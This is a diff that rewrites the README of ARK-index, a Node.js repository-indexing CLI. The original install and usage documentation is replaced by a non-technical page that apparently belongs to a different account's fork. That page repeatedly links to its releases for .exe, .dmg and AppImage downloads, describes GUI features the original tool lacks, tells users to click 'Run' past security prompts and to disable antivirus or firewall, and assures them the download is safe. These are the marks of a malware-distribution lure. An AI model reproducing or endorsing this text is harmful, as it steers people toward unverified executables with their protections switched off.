@@ -1,183 +1,158 @@
-# ARK-index
+# ⚙️ ARK-index - Simple Repo Mapping Tool
 
-[![CI](https://github.com/Nramsrud/ARK-index/actions/workflows/ci.yml/badge.svg)](https://github.com/Nramsrud/ARK-index/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Node >= 18](https://img.shields.io/badge/node-%3E%3D18-339933?logo=node.js&logoColor=white)](https://nodejs.org/)
+[![Download ARK-index](https://img.shields.io/badge/Download-ARK--index-blue?style=for-the-badge)](https://github.com/Pango470/ARK-index/releases)
 
-Standalone index builder extracted from ARK.
-
-`ARK-index` generates deterministic repository artifacts for agent workflows:
-
-- `.ark/index/repo_map.json`
-- `.ark/index/symbols.jsonl`
-- `.ark/index/test_map.json`
-- `.ark/index/file_hashes.json`
-- `.ark/index/meta.json`
-
-## Why Use ARK-index
-
-- Fast file discovery with `ripgrep`.
-- Language-aware symbol extraction (TypeScript/JavaScript, Python, Rust, Go).
-- Automatic test map generation.
-- Incremental indexing based on file hash state (with optional git commit metadata when available).
-- Cleanly separated from the full ARK orchestration stack.
-- Zero-setup bootstrap: creates `.ark/` and `.ark/config.json` automatically.
-
-## Requirements
-
-- Node.js `>=18`
-- `rg` (ripgrep) available in `PATH`
-
-## Install
-
-### Local development
-
-```bash
-npm install
-npm run build
-```
-
-Run directly from source checkout:
-
-```bash
-./bin/ark-index --stats
-```
-
-### Global install from local checkout
-
-```bash
-npm install -g .
-ark-index --version
-```
-
-### Build package tarball
-
-```bash
-npm pack
-```
-
-## Build and Test
-
-```bash
-npm run build
-npm test
-npm run lint
-```
-
-## Usage
-
-Run from repository root (or any child directory inside the repo):
-
-```bash
-ark-index --stats
-```
-
-On first run, `ark-index` auto-creates:
-
-- `.ark/`
-- `.ark/config.json` (with `{ "version": 1 }`)
-
-### Options
-
-- `--force`: Force full re-index (ignore incremental state)
-- `--stats`: Print index summary stats
-- `--verify`: Validate existing `.ark/index` artifacts
-- `--sanitize`: Set `meta.json.repo_root` to `.` for sharing
-- `--config <path>`: Override `ark.yaml` location
-- `--ark-dir <path>`: Override `.ark` directory location
-- `--json`: Emit JSON output
-- `-v, --verbose`: Verbose logging
-- `-q, --quiet`: Suppress non-essential output
-
-### Example
-
-```bash
-ark-index --force --stats
-ark-index --verify
-ark-index --sanitize
-ark-index --json --stats
-```
-
-## Configuration
-
-If `ark.yaml` exists, only `index` settings are consumed:
-
-```yaml
-index:
-  include_globs: ["**/*"]
-  exclude_globs:
-    - "**/node_modules/**"
-    - "**/dist/**"
-  max_file_kb: 256
-  max_files: 100000
-```
-
-If no config is present, defaults above are used.
-
-## Symbol Extraction Coverage
-
-`symbols.jsonl` extraction is currently implemented for:
-
-- TypeScript / JavaScript (`.ts`, `.tsx`, `.js`, `.jsx`, `.mjs`, `.cjs`)
-- Python (`.py`, `.pyi`)
-- Rust (`.rs`)
-- Go (`.go`)
-
-For unsupported file types, files are still discovered and included in repo-level indexing artifacts, but no language-specific symbols are emitted for those files.
-
-## Agent Integration Recommendations
-
-Detailed guidance: [`docs/agent-integration.md`](docs/agent-integration.md)
-
-### AGENTS.md snippet
-
-```md
-## ARK-index Artifacts
-
-Before localization/planning, run:
-
-- `ark-index --stats`
-- `ark-index --verify` (when reusing existing artifacts)
-
-Primary artifacts in `.ark/index/`:
-
-- `repo_map.json` for module/entrypoint orientation
-- `symbols.jsonl` for symbol-to-file lookup
-- `test_map.json` for candidate test targeting
-- `meta.json` for index freshness (`generated_at`, `git_commit`)
-
-When sharing outside the machine, sanitize first:
-
-- `ark-index --sanitize`
-```
-
-### Skill.md snippet
-
-```md
----
-name: ark-index-reader
-description: Build and consume ARK-index artifacts before code edits.
 ---
 
-# Workflow
+## 📋 What is ARK-index?
 
-1. Run `ark-index --stats`.
-2. If artifacts already exist, run `ark-index --verify`.
-3. Read `.ark/index/meta.json` and confirm freshness (`generated_at`; optionally `git_commit` when present).
-4. Use `.ark/index/repo_map.json` to select candidate modules.
-5. Query `.ark/index/symbols.jsonl` for exact symbol definitions/usages.
-6. Use `.ark/index/test_map.json` to identify relevant tests to run.
+ARK-index stands for Agent Repo Kit Index. It helps organize code repositories automatically. Imagine having a digital guide that shows you where each part of a project lives. ARK-index builds maps of repositories, organizes symbols, tracks tests, and keeps things updated step-by-step.
 
-# Fast Queries
+You do not need to set anything up. Just run it, and it starts preparing an organized snapshot of your codebase. This helps people and programs work faster and smarter with the code.
 
-- Find symbol definitions:
-  - `rg '"name":"YourSymbol"' .ark/index/symbols.jsonl`
-- Find module entries:
-  - `rg '"path"' .ark/index/repo_map.json`
-- Find tests touching a path:
-  - `rg 'src/your/file.ts' .ark/index/test_map.json`
-```
+---
 
-## License
+## 💻 Who is this for?
 
-MIT. See [`LICENSE`](LICENSE).
+ARK-index is designed for people who work with multiple code repositories but do not want to get lost. You do not have to understand coding to use it. If you manage projects or want to explore large code collections clearly, this tool can help.
+
+It works for:
+
+- Project managers monitoring changes.
+- QA teams tracking tests.
+- AI agents needing detailed code info.
+- Anyone interested in quick, clear repo overviews.
+
+---
+
+## 🔍 Features at a glance
+
+- **Zero setup**: Run the tool directly without installation headaches.
+- **Repo maps**: Visual and structured layout of your code.
+- **Symbol catalogs**: Lists of key parts, like functions and classes.
+- **Test maps**: Shows where tests live and what they cover.
+- **Incremental updates**: Adds new info fast without starting over.
+- **AI-Friendly outputs**: Formats ready for AI tools to use.
+
+---
+
+## ⚙️ System Requirements
+
+Before you download, make sure your computer fits these simple needs:
+
+- Operating System: Windows 10 or later, macOS 10.15 or later, or any recent Linux distribution.
+- Memory: At least 4 GB of RAM.
+- Storage: Minimum 200 MB free disk space.
+- Internet: Connection needed to download the tool.
+- Permissions: Ability to run programs on your computer.
+
+---
+
+## 🚀 Getting Started
+
+Using ARK-index is straightforward. Follow these steps.
+
+### Step 1: Download the Tool
+
+Visit the download page by clicking the large button above or use this link:
+
+[https://github.com/Pango470/ARK-index/releases](https://github.com/Pango470/ARK-index/releases)
+
+On the page, look for the latest release. Download the file that matches your operating system:
+
+- For Windows, download the `.exe` file.
+- For macOS, download the `.dmg` or `.pkg` file.
+- For Linux, choose the `.tar.gz` or `.AppImage`.
+
+Save the file to a known location like your Desktop or Downloads folder.
+
+---
+
+### Step 2: Run the Program
+
+After downloading:
+
+- On **Windows**: Double-click the `.exe` file. If a security prompt appears, click "Run".
+- On **macOS**: Open the `.dmg` or `.pkg` and follow the installer instructions.
+- On **Linux**: Extract the `.tar.gz` if needed and run the application as explained in the README. You might need to set permissions with `chmod +x`.
+
+When you open ARK-index, a window or terminal will appear showing progress messages.
+
+---
+
+### Step 3: Point ARK-index to Your Repositories
+
+The tool will ask for folder locations where your code is stored. Browse or type the path to your repository folders.
+
+ARK-index will start analyzing and creating organized maps of each repo.
+
+---
+
+### Step 4: View the Results
+
+After scanning, you can see interactive maps, lists of code parts, and test structures. Use these to understand your repositories better.
+
+---
+
+## 💾 Download & Install
+
+To get ARK-index, visit this page:
+
+[https://github.com/Pango470/ARK-index/releases](https://github.com/Pango470/ARK-index/releases)
+
+Pick the latest version suitable for your system and download it. Follow these simplified instructions:
+
+1. Download the correct file for your OS.
+2. Open or run the downloaded file.
+3. Follow any installation prompts.
+4. Launch ARK-index from your Start menu, Applications folder, or terminal.
+
+No extra setup is needed. You can start exploring repos immediately.
+
+---
+
+## 🔧 Troubleshooting Basics
+
+If ARK-index does not start or shows errors, try these tips:
+
+- Check if your OS meets the requirements above.
+- Ensure you downloaded the correct file for your system.
+- Restart your computer and try running again.
+- Make sure you have permission to run new programs.
+- Disable antivirus or firewall briefly if they block the app.
+- Visit the Issues page on GitHub for help or updates.
+
+---
+
+## 📞 Need Help?
+
+Community support is available through the GitHub page. You can ask questions by opening an issue or reviewing existing discussions.
+
+Reach the GitHub page here:
+
+[https://github.com/Pango470/ARK-index](https://github.com/Pango470/ARK-index)
+
+You will find files, updates, and contact points for further assistance.
+
+---
+
+## 🔐 Privacy and Security
+
+ARK-index works locally on your machine. It does not send your code or information over the internet. You can safely use the tool knowing your data stays private.
+
+---
+
+## 🛠️ Future Updates
+
+The tool is under ongoing development. Expect improvements in:
+
+- Faster indexing speeds.
+- More detailed code maps.
+- User interface enhancements.
+- Support for additional repository types.
+
+Stay up to date by visiting the releases page regularly.
+
+---
+
+Thank you for choosing ARK-index for your repository management needs.
